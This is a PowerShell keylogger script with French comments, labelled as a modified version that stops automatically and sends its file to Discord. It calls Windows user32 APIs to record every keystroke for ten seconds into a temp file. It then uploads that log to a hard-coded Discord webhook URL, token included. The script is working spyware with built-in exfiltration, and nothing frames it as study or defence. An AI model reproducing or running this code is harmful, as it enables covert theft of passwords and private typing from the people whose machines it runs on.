<#
PowerShell keystroke logger by shima
Modifié : arrêt automatique + envoi fichier Discord
#>

function KeyLog {

    $MAPVK_VK_TO_VSC = 0x00
    $MAPVK_VSC_TO_VK = 0x01
    $MAPVK_VK_TO_CHAR = 0x02
    $MAPVK_VSC_TO_VK_EX = 0x03
    $MAPVK_VK_TO_VSC_EX = 0x04

    $virtualkc_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@

    $kbstate_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
'@

    $mapchar_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
'@

    $tounicode_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    $getKeyState = Add-Type -MemberDefinition $virtualkc_sig -name "Win32GetState" -namespace Win32Functions -passThru
    $getKBState = Add-Type -MemberDefinition $kbstate_sig -name "Win32MyGetKeyboardState" -namespace Win32Functions -passThru
    $getKey = Add-Type -MemberDefinition $mapchar_sig -name "Win32MyMapVirtualKey" -namespace Win32Functions -passThru
    $getUnicode = Add-Type -MemberDefinition $tounicode_sig -name "Win32MyToUnicode" -namespace Win32Functions -passThru

    $startTime = Get-Date
    $duration = 10

    Write-Host "⏱️  KeyLogger démarré - Arrêt automatique dans $duration secondes..." -ForegroundColor Green

    while ($true) {
        $elapsedTime = (Get-Date) - $startTime
        if ($elapsedTime.TotalSeconds -ge $duration) {
            Write-Host "`n⏹️  KeyLogger arrêté après $duration secondes" -ForegroundColor Red
            break
        }

        Start-Sleep -Milliseconds 40
        $gotit = ""

        for ($char = 1; $char -le 254; $char++) {
            $vkey = $char
            $gotit = $getKeyState::GetAsyncKeyState($vkey)

            if ($gotit -eq -32767) {

                $l_shift = $getKeyState::GetAsyncKeyState(160)
                $r_shift = $getKeyState::GetAsyncKeyState(161)
                $caps_lock = [console]::CapsLock

                $scancode = $getKey::MapVirtualKey($vkey, $MAPVK_VSC_TO_VK_EX)

                $kbstate = New-Object Byte[] 256
                $checkkbstate = $getKBState::GetKeyboardState($kbstate)

                $mychar = New-Object -TypeName "System.Text.StringBuilder"
                $unicode_res = $getUnicode::ToUnicode($vkey, $scancode, $kbstate, $mychar, $mychar.Capacity, 0)

                if ($unicode_res -gt 0) {
                    $logfile = "$env:temp\key.log"
                    Out-File -FilePath $logfile -Encoding Unicode -Append -InputObject $mychar.ToString()
                }
            }
        }
    }
}

# 🚀 Lancer le keylogger
KeyLog

# 📁 Envoyer le fichier sur Discord
$logfile = "$env:temp\key.log"
$webhook = "https://discord.com/api/webhooks/1197260699768987748/MusyfmoPCs0DkrWb1IH2uQ0Aw6p369foF6pVYynOxL5x0wYokip9_a-kkhpbhWVATEHn"

Write-Host "`n📤 Envoi du fichier sur Discord..." -ForegroundColor Yellow

if (Test-Path $logfile) {
    try {
        # Envoyer le fichier directement
        Invoke-RestMethod -Uri $webhook -Method Post -Form @{
            "payload_json" = @{content = "🔐 Keylog enregistré"} | ConvertTo-Json
            "file" = Get-Item $logfile
        }
        Write-Host "✅ Fichier envoyé avec succès !" -ForegroundColor Green
    } catch {
        Write-Host "❌ Erreur : $_" -ForegroundColor Red
    }
} else {
    Write-Host "❌ Fichier non trouvé" -ForegroundColor Red
}
